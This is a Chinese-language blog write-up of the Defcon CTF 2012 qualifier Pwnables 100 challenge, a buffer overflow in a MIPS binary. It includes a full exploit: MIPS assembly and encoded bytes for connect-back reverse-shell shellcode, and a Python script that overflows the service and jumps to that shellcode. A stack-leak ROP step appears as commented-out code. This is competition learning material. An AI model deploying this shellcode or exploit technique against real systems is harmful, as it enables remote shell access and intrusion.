---
source: orange-tsai
source_url: https://blog.orange.tw/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/
title: "Defcon ctf 20 qual pp100 Writeup | Orange Tsai"
author: "Orange Tsai"
published: 2012-06-18T16:00:00.000Z
description: "DEBUG 又到了一年一度的駭客界盛事 Defcon ctf qual 的……. 半個月後了，期末考終於有時間來寫個 write up 了XD 由於沒有在時間內解完，所以這篇算是事後腦補文！ 沒在時間內解出卡住的點是，沒有看出有 setrlimit 的限制以及，腦袋轉的不夠快沒有想到利用 ROP 去 leak memory address Pwnables 100題目描述 Pwn it! Run"
---

* * *

[DEBUG](https://blog.orange.tw//2012/06/defcon-ctf-20-qual-pp100-writeup.html)

又到了一年一度的駭客界盛事 Defcon ctf qual 的……. 半個月後了，期末考終於有時間來寫個 write up 了XD 由於沒有在時間內解完，所以這篇算是事後腦補文！

沒在時間內解出卡住的點是，沒有看出有 setrlimit 的限制以及，腦袋轉的不夠快沒有想到利用 ROP 去 leak memory address

# [Pwnables 100](https://blog.orange.tw/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/\#Pwnables-100 "Pwnables 100") Pwnables 100

題目描述

> Pwn it! Running on 140.197.217.85:1994 Download the binary

檔案可以在這下載

> [http://rdlabs.org/dc20qual/pwn100-mv6bd73ca07e54cbb28a3568723bdc6c9a](http://rdlabs.org/dc20qual/pwn100-mv6bd73ca07e54cbb28a3568723bdc6c9a)

連進去長得像這樣

![](https://blog.orange.tw/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/1cad112c084e9f9a-01.jpg)

可以用 binutils 的 file 觀察發現是 MIPS 架構的 ELF binary

|     |     |
| --- | --- |
| ```<br>1<br>2<br>``` | ```<br>orange@z:~/ctf$ file pp100<br>pp100: ELF 32-bit LSB executable, MIPS, MIPS-I version 1 (SYSV), statically linked, for GNU/Linux 2.4.18, stripped<br>``` |

環境可以利用 QEMU 架起來，可參考 [這篇](http://weng32002.blogspot.tw/2011/03/qemu.html)

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>``` | ```<br>qemu-system-mipsel.exe \<br>    -M malta \<br>    -kernel vmlinux-2.6.32-5-4kc-malta \<br>    -hda debian_squeeze_mipsel_standard.qcow2 \<br>    -append "root=/dev/sda1 console=tty0"<br>``` |

想要網路的話加上參數 `-net user` & `-net nic`，想到 forward port 的話加上參數 `-redir tcp:22::22` (Host OS 22 port to Guest OS 22 port)，QEMU 長得像這樣

![](https://blog.orange.tw/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/70b760f0262a55d5-02.jpg)

接著開始進行分析，配合 IDA pro 觀察，在 gdb 中會發現在 `png2ascii` 指令內超過一定長度會產生 Segmentation fault. 慢慢減少字串長度發現在 260 bytes 後的字元可以覆蓋到 PC

> python -c “print ‘png2ascii\\n’ + “0”\*260 +’A’\*4” \| nc 0 1994

![](https://blog.orange.tw/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/5466a31e3ffd6f8c-03.jpg)

很簡單的 Buffer overflow 不過是 MIPS ~“~

可以很快地寫出 Exploit 但是 shellcode 有大小限制 ，網路上的皆無法使用所以只好自己寫 = =\|\|\| (網路上的 shellcode 是考慮到 null byte，所以利用變形的方式繞過所以寫得又臭又長，而且還有寫錯的 ~~“~~)

要注意的點

1. MIPS 有分 Big endian 以及 Little endian，可以從 “\\xc0\\x01\\x01\\x01” or “\\x01\\x01\\x01\\xc0” 看出
2. syscall 值 可以參考 /usr/include/asm/unistd.h
3. MIPS 參數傳遞由 a0,a1,a2,a3 下去
4. MIPS 回傳值位於 ra
5. 字串放進 stack 內位置要對齊，不然會寫得很幹！

透過 gdb, gcc, objdump, strace 可以寫出 shellcode，大致如

> setrlimit -> socket -> connect -> dup2(將 stdout, stdin, stderr 轉至 fd) -> execv

Reference 中另外一隊的寫法是直接將當前連線當成資料交換的地方，直接 dup2，更厲害讓 shellcode 更短

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>52<br>53<br>54<br>55<br>``` | ```<br>void main() {<br>    // setrlimit<br>    asm("li $v0,4075");<br>    asm("li $a0,5");<br>    asm("addiu $a1,$sp,-64");<br>    asm("li $t7,100");<br>    asm("sw $t7,-64($sp)");<br>    asm("sw $t7,-60($sp)");<br>    asm("syscall 0x40404");<br>    // socket<br>    asm("li $a0,2");<br>    asm("li $a1,2");<br>    asm("li $a2,6");<br>    asm("li $v0,4183");<br>    asm("syscall 0x40404");<br>    // connect<br>    asm("sw $v0,-1($sp)");<br>    asm("lw $a0,-1($sp)");<br>    asm("lui $t7,0x5555");      // port<br>    asm("ori $t7, $t7,2");<br>    asm("sw $t7,-32($sp)");<br>    asm("lui $t5,0xc893");      // IP<br>    asm("ori $t5,$t5,0xe6ad");  // IP<br>    asm("sw $t5,-28($sp)");<br>    asm("addi $a1,$sp,-32");<br>    asm("li $a2,16");<br>    asm("li $v0,4170");<br>    asm("syscall 0x40404");<br>    //dup2<br>    asm("li $a1,2");<br>    asm("lw $a0,-1($sp)");<br>    asm("out:");<br>    asm("li $v0,4063");<br>    asm("syscall 0x40404");<br>    asm("addi $a1,$a1,-1");<br>    asm("li $t3,-1");<br>    asm("bne $a1,$t3,out");<br>    // execv<br>    asm("lui $t7,0x6e69");<br>    asm("ori $t7,$t7,0x622f");<br>    asm("sw $t7,-12($sp)");<br>    asm("lui $t6,0x68");<br>    asm("ori $t6,$t6,0x732f");<br>    asm("sw $t6,-8($sp)");<br>    asm("sw $zero,-4($sp)");<br>    asm("addiu $a0,$sp,-12");<br>    asm("li $a1,0");<br>    asm("li $a2,0");<br>    asm("li $v0,4011");<br>    asm("syscall 0x40404");<br>}<br>``` |

總共長度為 176 bytes，接下來的問題就是如何找到 shellcode 在 stack 的位置

![](https://blog.orange.tw/posts/2012-06-defcon-ctf-20-qual-pp100-writeup/857792e151f46a91-04.jpg)

利用 Return Oriented Programming (ROP) 可以跳至 syscall `__NR_send` 的位置，並且參數可以自己控制最終將 Remote 的記憶體資料讀回來找出 shellcode 位置，最終的 Exploit python code

|     |     |
| --- | --- |
| ```<br>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br>48<br>49<br>50<br>51<br>``` | ```<br>import socket<br>from struct import pack<br>HOST = "140.197.217.85"<br>#HOST = "127.0.0.1"<br>PORT = 1994<br>sc = (  "\xEB\x0F\x02\x24\x05\x00\x04\x24\xC0\xFF\xA5\x27\x64\x00\x0F\x24"<br>        "\xC0\xFF\xAF\xAF\xC4\xFF\xAF\xAF\x0C\x01\x01\x01\x02\x00\x04\x24"<br>        "\x02\x00\x05\x24\x06\x00\x06\x24\x57\x10\x02\x24\x0C\x01\x01\x01"<br>        "\xFF\xFF\xA2\xAF\xFF\xFF\xA4\x8F\x55\x55\x0F\x3C\x02\x00\xEF\x35"<br>        "\xE0\xFF\xAF\xAF\x93\xC8\x0D\x3C\xAD\xE6\xAD\x35\xE4\xFF\xAD\xAF"<br>        "\xE0\xFF\xA5\x23\x10\x00\x06\x24\x4A\x10\x02\x24\x0C\x01\x01\x01"<br>        "\x02\x00\x05\x24\xFF\xFF\xA4\x8F\xDF\x0F\x02\x24\x0C\x01\x01\x01"<br>        "\xFF\xFF\xA5\x20\xFF\xFF\x0B\x24\xFB\xFF\xAB\x14\x25\x08\x20\x00"<br>        "\x69\x6E\x0F\x3C\x2F\x62\xEF\x35\xF4\xFF\xAF\xAF\x68\x00\x0E\x3C"<br>        "\x2F\x73\xCE\x35\xF8\xFF\xAE\xAF\xFC\xFF\xA0\xAF\xF4\xFF\xA4\x27"<br>        "\x00\x00\x05\x24\x00\x00\x06\x24\xAB\x0F\x02\x24\x0C\x01\x01\x01"<br>    )<br>nop = "A"*(260-len(sc))<br>retAddr = 0x7f7fbc6a    # shellcode address<br>#retAddr = 0x00411498    # ROP to leak stack address<br>if __name__ == "__main__":<br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.connect((HOST, PORT))<br>    s.recv(1024)<br>    s.recv(1024)<br>    s.send('png2ascii\n')<br>    s.recv(1024)<br>    # get stack memoery<br>    # s.send(nop + \<br>    #        sc + \<br>    #        pack("I", retAddr) + \<br>    #        pack("I", 4) + \<br>    #        pack("I", 0x4bd740 ) + \<br>    #        pack("I", 0xffff) + \<br>    #        pack("I", 0) + "\n"<br>    #      )<br>    # tmp = []<br>    # for i in range(0, 0xffff, 1024):<br>    #    buf = s.recv(1024)<br>    #    tmp.append( buf )<br>    # with open("temp.txt", "w+") as fp:<br>    #    fp.write( "".join(tmp) )<br>    # jump to shellcode<br>    s.send(nop + sc + pack("I", retAddr) + "1234")<br>    s.close()<br>``` |

Reference:

> [http://blog.lse.epita.fr/articles/17-defcon2k12-prequals-pwn100-writeup.html](http://blog.lse.epita.fr/articles/17-defcon2k12-prequals-pwn100-writeup.html)
>
> [http://www.exploit-db.com/exploits/18226/](http://www.exploit-db.com/exploits/18226/)
>
> [http://www.thc.org/root/docs/exploit\_writing/mipsshellcode.pdf](http://www.thc.org/root/docs/exploit_writing/mipsshellcode.pdf)